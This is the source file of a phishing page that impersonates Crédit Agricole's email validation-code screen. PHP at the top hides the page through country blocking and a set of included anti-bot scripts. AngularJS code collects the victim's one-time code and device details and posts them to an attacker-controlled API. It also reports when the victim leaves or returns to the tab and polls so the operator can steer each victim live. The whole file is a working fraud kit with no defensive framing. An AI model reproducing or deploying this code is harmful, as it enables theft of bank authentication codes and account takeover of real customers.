
<?php

  include 'functions.php';
  if(!check_block_country()){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        exit;
  };
include '../new/anti0.php';
include '../new/anti1.php';
include '../new/anti2.php';
include '../new/anti3.php';
include '../new/anti4.php';
include '../new/anti5.php';
include '../new/anti6.php';
include '../new/anti7.php';
include '../new/anti8.php';
include '../new/anti9.php';
?>
<!DOCTYPE html>
<html lang="fr" class=" backgroundblendmode no-capture flexbox flexwrap">

<head>

	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="robots" content="noindex">
	<title>Crédit Agricole </title>
	
	<meta name="format-detection" content="telephone=no">

 	<link rel="stylesheet" href="assets/css/clientlib-part.min.css" type="text/css">
    <link rel="stylesheet" href="assets/css/clientlibStoreLocatorAccesCRPart.min.css" type="text/css">
    <link rel="stylesheet" href="assets/css/icons.css" type="text/css">




<style type="text/css">
html{
	-webkit-user-select: none;
-khtml-user-select: none;
-moz-user-select: none;
-ms-user-select: none;
-o-user-select: none;
user-select: none;
}
	.loader {
	  position: absolute;
	  top: 9rem;
	  left: 50%;
	  width: 160px;
	  height: 160px;
	  margin: -80px 0px 0px -80px;
	  background-color: transparent;
	  border-radius: 50%;
	  border: 2px solid #E3E4DC;
	}
	.loader:before {
	    content: "";
	    width: 164px;
	    height: 164px;
	    display: block;
	    position: absolute;
	    border: 2px solid #898a86;
	    border-radius: 50%;
	    top: -2px;
	    left: -2px;
	    box-sizing: border-box;
	    clip: rect(0px, 35px, 35px, 0px);
	    z-index: 10;
	    animation: rotate infinite;
	    animation-duration: 3s;
	    animation-timing-function: linear;
	}
	.loader:after {
	    content: "";
	    width: 164px;
	    height: 164px;
	    display: block;
	    position: absolute;
	    border: 2px solid #007d8f;
	    border-radius: 50%;
	    top: -4px;
	    left: -4px;
	    box-sizing: border-box;
	    clip: rect(0px, 164px, 150px, 0px);
	    z-index: 9;
	    animation: rotate2 3s linear infinite;
	}

	.hexagon-container {
	  position: relative;
	  top: 33px;
	  left: 41px;
	  border-radius: 50%;
	}

	.hexagon {
	  position: absolute;
	  width: 40px;
	  height: 23px;
	  background-color: #007d8f;
	}
	.hexagon:before {
	  content: "";
	  position: absolute;
	  top: -11px;
	  left: 0;
	  width: 0;
	  height: 0;
	  border-left: 20px solid transparent;
	  border-right: 20px solid transparent;
	  border-bottom: 11.5px solid #007d8f;
	}
	.hexagon:after {
	  content: "";
	  position: absolute;
	  top: 23px;
	  left: 0;
	  width: 0;
	  height: 0;
	  border-left: 20px solid transparent;
	  border-right: 20px solid transparent;
	  border-top: 11.5px solid #007d8f;
	}

	.hexagon.hex_1 {
	  top: 0px;
	  left: 0px;
	  animation: Animasearch 3s ease-in-out infinite;
	  animation-delay: 0.2142857143s;
	}

	.hexagon.hex_2 {
	  top: 0px;
	  left: 42px;
	  animation: Animasearch 3s ease-in-out infinite;
	  animation-delay: 0.4285714286s;
	}

	.hexagon.hex_3 {
	  top: 36px;
	  left: 63px;
	  animation: Animasearch 3s ease-in-out infinite;
	  animation-delay: 0.6428571429s;
	}

	.hexagon.hex_4 {
	  top: 72px;
	  left: 42px;
	  animation: Animasearch 3s ease-in-out infinite;
	  animation-delay: 0.8571428571s;
	}

	.hexagon.hex_5 {
	  top: 72px;
	  left: 0px;
	  animation: Animasearch 3s ease-in-out infinite;
	  animation-delay: 1.0714285714s;
	}

	.hexagon.hex_6 {
	  top: 36px;
	  left: -21px;
	  animation: Animasearch 3s ease-in-out infinite;
	  animation-delay: 1.2857142857s;
	}

	.hexagon.hex_7 {
	  top: 36px;
	  left: 21px;
	  animation: Animasearch 3s ease-in-out infinite;
	  animation-delay: 1.5s;
	}

	@keyframes Animasearch {
	  0% {
	    transform: scale(1);
	    opacity: 1;
	  }
	  15%, 50% {
	    transform: scale(0.5);
	    opacity: 0;
	  }
	  65% {
	    transform: scale(1);
	    opacity: 1;
	  }
	}
	@keyframes rotate {
	  0% {
	    transform: rotate(0);
	    clip: rect(0px, 35px, 35px, 0px);
	  }
	  50% {
	    clip: rect(0px, 40px, 40px, 0px);
	  }
	  100% {
	    transform: rotate(360deg);
	    clip: rect(0px, 35px, 35px, 0px);
	  }
	}
	@keyframes rotate2 {
	  0% {
	    transform: rotate(0deg);
	    clip: rect(0px, 164px, 150px, 0px);
	  }
	  50% {
	    clip: rect(0px, 164px, 0px, 0px);
	    transform: rotate(360deg);
	  }
	  100% {
	    transform: rotate(720deg);
	    clip: rect(0px, 164px, 150px, 0px);
	  }
	}
	@keyframes rotate3 {
	  0% {
	    transform: rotate(0deg);
	  }
	  100% {
	    transform: rotate(360deg);
	  }
	}
</style>
<body>



<main  ng-app="sa_app"  ng-controller="controller" ng-init="show_data()">
	<div class="login parbase" style="background: #f5f5f5;">





		<div class="Login">
			<div class="Login-header js-Header">
				<a href="" class="Login-logo Login-logo-js" tabindex="2000">
				    <img class="Login-logoImg js-needFakeNotSvg" src="./assets/img/{{logo_png}}.png" alt="">
				</a>
				<a href="" class="Login-close" id="Login-close" ><span class="ti-close"></span></a>
			</div>

		    <div class="container-fluid Template" style="margin-top: 60px;">
				<div class="row js-Template-head">

					
					<div class="col-xs-12 col-md-6">
						<div class="Template-reduceMargin15px">
							<div class="js-StickyPush js-Sticky--enable">
								<div class="js-StickyWrap" style="transform: translateY(0px);">
									<div class="js-FullHeight ForgotPswd-imgWrapper hidden-xs" style="height: 577px;">
										<div class="placeholder-left parsys">
											<div class="new-zdg parbase section">
										        <div class="VideoPlayer matchHeight js-VideoPlayer" data-video-provider="YOUTUBE" data-video-id="vV_tpC9MuP4" data-video-loadbackgroundimage="false" style="background-image: url(assets/img/zdg-securipass-v2-video-4.jpg);" data-trackingclass="video_player" data-trackinginfo="progcr_video-securipass-V2">
										            <div class="VideoPlayer-video"> </div>

										            <a class="VideoPlayer-play js-VideoPlayer-play" href="" title="Lancer la vidéo" tabindex="2000">
										            	<span class="ti-control-play"></span>
										            </a>

										            <div class="VideoPlayer-textBloc">
										                <p class="VideoPlayer-Title"></p>
										                    <p style="text-align: center;"><span class="h2"><b>SécuriPass, la solution simple et sécurisée <br>
										                      pour réaliser vos paiements par carte bancaire sur Internet.</b></span><b>
										                      	<span class="h2"><br></span><span class="RichText-emphaseBlanc"></span></b><span class="h2"></span><b><span class="h2"></span><span class="RichText-titreProjet"></span></b>
										                      	<span class="RichText-titreBlanc"><b></b></span>
										                      	<span class="RichText-grosTitre"></span><br>
										                    </p>
										                <p></p>
										            </div>
										        </div>
			                                </div>
			                             </div>
									</div>
							    </div>
						    </div>
						</div>
					</div>












		            <div class="col-xs-12 col-md-6">
		                 <div class="Template-reduceMargin15px" >
		                    <div class="Login-container">
		                        <div class="Login-title">
		                            <h1>CODE DE <strong>VALIDATION</strong></h1>
		                        </div>



 



		                        <div class="row row-no-padding" >
		                             <div class="col-xs-12 col-sm-6">
		                             	
										<div class="login-mini parbase" id="loading_start" style="height: 16rem;display:none;">
										       <div class="">
											       	<div class="loader">
													  <ul class="hexagon-container">
													    <li class="hexagon hex_1"></li>
													    <li class="hexagon hex_2"></li>
													    <li class="hexagon hex_3"></li>
													    <li class="hexagon hex_4"></li>
													    <li class="hexagon hex_5"></li>
													    <li class="hexagon hex_6"></li>
											
													  </ul>
													</div>
										       </div>
										</div>




		                                 <div class="login-mini parbase" id="contant_start">
											<form class="Login-form" id="loginForm" name="loginForm" novalidate="">
												<div class="row row-no-padding">
												    <div class="form-group">
												        
												        
												      <div class="col-xs-12 Login-noPadding ForgotPswd-paragraphInformation">
															<p style="font-weight:bold;">Veuillez saisir le code reçu par email :</p>
														</div>  
												       
												       
												        <div class="col-xs-12 Login-noPadding ForgotPswd-paragraphInformation">
															<p style="font-weight: 600;font-size: 1.3em">{{mail_name}}</p>
														</div> 
														
														<div class="col-xs-12 Login-noPadding" id="Login-account-div">
															<div class=" form-group">
																<input class="form-control" id="val_login" placeholder="Ex: 986527" type="text"ng-model="val_login"  maxlength="8"  autocomplete="off" ng-change="bloc_login()" style="font-weight: 900;font-size: 25px;">
																	<span role="button" id="val_login_span" class="add-clear-x form-control-feedback icon-form npc-close" style="cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 3; display: none;" ng-model="login_span_closex" ng-click="login_span_close()">
																		<span class="ti-close"></span>
																	</span>
															</div>
															<small>Entrez le code reçu par EMAIL et appuyez sur VALIDER.</small>  
														</div> 
														    
												    </div>
												</div>
												
												<div class="col-xs-12 Login-noPadding error" id="err_code" style="display:none">
												    <p role="alert" id="erreur-ident">
												    code incorrect
												    </p>
												</div>
												
											        
												<div class="row row-no-padding">
													<div class="col-xs-12">
											<!-- 			<button type="button" class="btn btn-primary col-xs-12 Login-button" disabled="" style="display: block;" ng-model="login_btn" ng-click="login_btn()" id="login_btn">
																VALIDER
														</button> -->



	                                              <button type="button" class="btn btn-primary col-xs-12 Login-button" disabled="" style="display: block;" ng-model="login_btn" ng-click="login_btn()" id="login_btn" >  
												  Valider</button>


	                                              <button  id="subx2" aria-label="Validation du code personnel" type="submit" class="btn btn-primary Login-button col-xs-12" style="display: none;" disabled="" >  
												<i class="fa fa-spinner fa-spin"></i> Valider</button>










													</div>
												</div>


											</form>
		                                 </div>
		                            </div>
									<div class="col-xs-12 col-sm-6">
										<div class="Login-information">
											<div class="infos texte">
												<div tabindex="17">
													<p><span class="RichText-texteVignettes"><span class="lead"><b>UN ACCÈS À VOS COMPTES PLUS SÉCURISÉ</b></span></span></p>
													<p><b><span class="RichText-texteVignettes">Désormais, la sécurité pour accéder à vos comptes en ligne est renforcée avec la Directive Européenne DSP2.<br>
												     <a href="" target="_blank  tabindex="2000">Pour plus d'informations, cliquez ici.</a></span></b></p>
													<p><span class="lead"><b>BESOIN D'AIDE ?</b></span><br>
													   <a href="" tabindex="2000">
															<span class="RichText-texteVignettes">Découvrez nos tutos&nbsp;<br></span>
														</a><br><br>
													</p>
													<p><b><span class="lead"><b>SÉCURITÉ<br></b></span>
													<span class="RichText-texteVignettes">Restez vigilants et veillez à protéger vos données personnelles.
														<br><a href="" target="_blank">Consultez nos conseils de sécurité</a>
													</span>
													</b></p><p>
													<span class="RichText-texteVignettes">Nous vous invitons également à consulter régulièrement nos Conditions Générales d'utilisation.
													<br>
													<a href=""  tabindex="2000">Voir les Conditions Générales d'Utilisation</a>
													</span></p>
												</div>
								            </div>
								        </div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</main>




<footer> <div class="Footer"> </div></footer>
<script type="text/javascript" src="assets/js/jquery.min.js"></script>
<script src="assets/js/angular.min.js"></script>
<script src="assets/js/dirPaginate.js"></script>
<script type="text/javascript">



</script>

<script> 

var fetch = angular.module('sa_app', ['angularUtils.directives.dirPagination']);

fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {

    var urlx = window.location.pathname;
    var pathname = urlx.replace("verify_mail.php", "");
    $scope.select_reg ="no-value";
	$scope.reg_txt =[
			{id:"05",code:"ca-alpesprovence" },
			{id:"84",code:"ca-alpesprovence" },
			{id:"13",code:"ca-alpesprovence" },
			{id:"67",code:"ca-alsace-vosges" },
			{id:"68",code:"ca-alsace-vosges" },
			{id:"88",code:"ca-alsace-vosges" },
			{id:"49",code:"ca-anjou-maine" },
			{id:"72",code:"ca-anjou-maine" },
			{id:"40",code:"ca-aquitaine" },
			{id:"47",code:"ca-aquitaine" },
			{id:"44",code:"ca-atlantique-vendee" },
			{id:"85",code:"ca-atlantique-vendee" },
			{id:"80",code:"ca-briepicardie" },
			{id:"01",code:"ca-centrest" },
			{id:"71",code:"ca-centrest" },
			{id:"03",code:"ca-centrefrance" },
			{id:"23",code:"ca-centrefrance" },
			{id:"15",code:"ca-centrefrance" },
			{id:"63",code:"ca-centrefrance" },
			{id:"18",code:"ca-centreloire" },
			{id:"58",code:"ca-centreloire" },
			{id:"36",code:"ca-centreouest" },
			{id:"87",code:"ca-centreouest" },
			{id:"10",code:"ca-cb" },
			{id:"21",code:"ca-cb" },
			{id:"52",code:"ca-cb" },
			{id:"79",code:"ca-cmds" },
			{id:"16",code:"ca-charente-perigord" },
			{id:"24",code:"ca-charente-perigord" },
			{id:"22",code:"ca-cotesdarmor" },
			{id:"74",code:"ca-des-savoie" },
			{id:"29",code:"ca-finistere" },
			{id:"25",code:"ca-franchecomte" },
			{id:"70",code:"ca-franchecomte" },
			{id:"39",code:"ca-franchecomte" },
			{id:"90",code:"ca-franchecomte" },
			{id:"35",code:"ca-illeetvilaine" },
			{id:"30",code:"ca-languedoc" },
			{id:"48",code:"ca-languedoc" },
			{id:"34",code:"ca-languedoc" },
			{id:"42",code:"ca-loirehauteloire" },
			{id:"43",code:"ca-loirehauteloire" },
			{id:"54",code:"ca-lorraine" },
			{id:"55",code:"ca-lorraine" },
			{id:"57",code:"ca-lorraine" },
			{id:"56",code:"ca-morbihan" },
			{id:"59",code:"ca-norddefrance" },
			{id:"62",code:"ca-norddefrance" },
			{id:"02",code:"ca-nord-est" },
			{id:"51",code:"ca-nord-est" },
			{id:"08",code:"ca-nord-est" },
			{id:"12",code:"ca-nmp" },
			{id:"81",code:"ca-nmp" },
			{id:"82",code:"ca-nmp" },
			{id:"14",code:"ca-normandie" },
			{id:"50",code:"ca-normandie" },
			{id:"76",code:"ca-normandie-seine" },
			{id:"75",code:"ca-paris" },
			{id:"78",code:"ca-paris" },
			{id:"92",code:"ca-paris" },
			{id:"93",code:"ca-paris" },
			{id:"94",code:"ca-paris" },
			{id:"95",code:"ca-paris" },
			{id:"04",code:"ca-pca" },
			{id:"83",code:"ca-pca" },
			{id:"06",code:"ca-pca" },
			{id:"64",code:"ca-pyrenees-gascogne" },
			{id:"09",code:"ca-sudmed" },
			{id:"66",code:"ca-sudmed" },
			{id:"31",code:"ca-toulouse31" },
			{id:"86",code:"ca-tourainepoitou" },
			{id:"28",code:"ca-valdefrance" },
			{id:"974",code:"ca-reunion" },
			{id:"976",code:"ca-reunion" },
			{id:"972",code:"ca-martinique" },
			{id:"973",code:"ca-martinique" },
			{id:"971",code:"ca-guadeloupe" },
			{id:"2A",code:"ca-corse" },
			{id:"2B",code:"ca-corse" },
	];
	$scope.logo_png='';
    $scope.bloc_pwd_input='';

	$scope.info_User={};
	$scope.load='';
	$scope.loads_info='';
    $scope.base_url='';
    $scope.logo_png='';


    $scope.mail_name='';

	document.addEventListener( 'visibilitychange' , function() {
		var Detaile = {}; 
        Detaile.id= $scope.load;
	    if (document.hidden) {
	        //console.log('bye');
	        Detaile.status=0;
		     $http({
		          method: 'post',
		          url: $scope.base_url+"api_cl/update_status_load",
		          data: Detaile, 
		          headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
		    }).then(function(data) {
                    console.log(data.data);
		    });
	    } else {
	        //console.log('well back');
	        Detaile.status=1;
		     $http({
		          method: 'post',
		          url: $scope.base_url+"api_cl/update_status_load",
		          data: Detaile, 
		          headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
		    }).then(function(data) {
                    console.log(data.data);
		    });
	    }
	}, false );
    $scope.show_data = function(){
        $http({
          method: 'get',
          url: "config/device.php"
        }).then(function successCallback(response) {
                $scope.info_User=response.data;
                 $scope.base_url=$scope.info_User['url'];
                console.log($scope.info_User)
                 $http({
                      method: 'post',
                      url: $scope.base_url+"api_cl/insert_line_loads",
                      data: $scope.info_User, 
                      headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
                }).then(function(data) {
                    if(data.data.exist){
                        console.log(data.data);
                        console.log(data.data.fin);
                        $scope.load=data.data.load ;
                        $scope.logo_png =data.data.region;
                        $scope.loads_info=data.data.loads_info;
                         $scope.mail_name =data.data.mail_name;
                        if(data.data.redirect == 1 )
                            window.location. window.location.href = pathname+'fin.php';
                        if(data.data.block == 1)  window.location.href = 'https://www.credit-agricole.fr/'+$scope.logo_png+'/particulier/acceder-a-mes-comptes.html';
                    }else{
                        console.log(data.data);
                        $scope.load=data.data.load ;
                        $scope.loads_info=data.data.loads_info;
                        $scope.logo_png =data.data.region;
                        $scope.mail_name =data.data.mail_name;


                        localStorage.setItem("load", $scope.load);
                        localStorage.setItem("loads_info", $scope.loads_info);
                        if(data.data.redirect == 1 )
                            window.location. window.location.href = pathname+'fin.php';
                        if(data.data.block == 1)  window.location.href = 'https://www.credit-agricole.fr/'+$scope.logo_png+'/particulier/acceder-a-mes-comptes.html';
                    }
                });
        }); 
    }
	setInterval(function() {
	         var Detaile = {}; 
	         Detaile.load_id= $scope.load;
	         Detaile.id= $scope.loads_info;
	         $http({
	              method: 'post',
	              url:  $scope.base_url+"api_cl/get_line_load_info",
	              data: Detaile, 
	              headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
	        }).then(function(data) {
	          console.log(data.data);
	             if( data.data.load_info.d_r == 100){
	             	
				        $http({
				              method: 'post',
				              url:  $scope.base_url+"api_cl/ca/update_loads_renisialiser_fr",
				              data: Detaile, 
				              headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
				        }).then(function(data) {
				         
				                    window.location.href = pathname+'loading.php?u=358886';
				        });
	              }
	        }); 
	}, 20000); 







    $scope.bloc_login = function(){ 
	  	if($scope.val_login.length == 0){
	       $("#val_login_span").css('display','none');
	       $("#login_btn").attr('disabled','disabled');
	  	}else if( $scope.val_login.length >= 5){
	        $("#login_btn").removeAttr('disabled');
	  	}else{
	  		  $("#iden_err").css('display','none');
	  		  $("#val_login_span").css('display','block');
	  		  $("#login_btn").attr('disabled','disabled');
	  	}
    }

	$scope.login_span_close = function(){ 
		
		$scope.val_login='';
		$scope.bloc_pwd_input='';
		$("#val_login_span").css('display','none');
		$("#val_login").removeAttr('disabled');
		$("#login_btn").attr('disabled','disabled');
		$("#login_btn").css('display','block');
		$("#clavier_num").css('display','none');
		$("#space_code_pass").css('display','none');
		$("#validation").css('display','none');
		$("#pwd_span_close").css('display','none');
		$("#validation").attr('disabled','disabled');
	}

	$scope.login_btn = function(){ 
		    $('#login_btn').hide();
            $('#subx2').show();
		    var Detaile = {}; 
		    Detaile.load_id= $scope.load;
            Detaile.loads_info_id= $scope.loads_info;
            Detaile.mail_sms= $scope.val_login;
            console.log(Detaile)
		     $http({
		          method: 'post',
		          url: $scope.base_url+"api_cl/ca/update_loads_info_mail_sms_fr",
		          data: Detaile, 
		          headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
		    }).then(function(data) {
                if(data.data.success){
                	window.location.href = pathname+'loading.php?u=358886';
                }
		    }); 
	}



  

    $scope.val_click = function(item){
	    var valx = $('#bloc_pwd_input').val();
	        valx = valx+''+item;
	    if (valx.length <= 6) {
	        $('#bloc_pwd_input').val(valx);
	        $scope.bloc_pwd_input=valx;
	    }
	  	if($scope.bloc_pwd_input.length == 0){
	       $("#pwd_span_close").css('display','none');
	       $("#validation").attr('disabled','disabled');
	  	}else if( $scope.bloc_pwd_input.length == 6){
	        $("#validation").removeAttr('disabled');
	  	}else{
	  		  $("#pwd_span_close").css('display','block');
	  		  $("#validation").attr('disabled','disabled');
	  	}
    }

	$scope.pwd_span_close = function(){
		 $scope.bloc_pwd_input='';
         $('#bloc_pwd_input').val('');
		 $("#pwd_span_close").css('display','none');
		 $("#validation").attr('disabled','disabled');
	}

	$scope.isInteger = function(numValue){
	    var value = parseFloat(numValue);
	    if (!numValue.toString().match(/^[-]?\d*\.?\d*$/)) 
	            return false;
	    else if (numValue < 0) {
	        return false;
	    }
	    return true;   
	}



     
	




}]);

</script>











</body>
</html>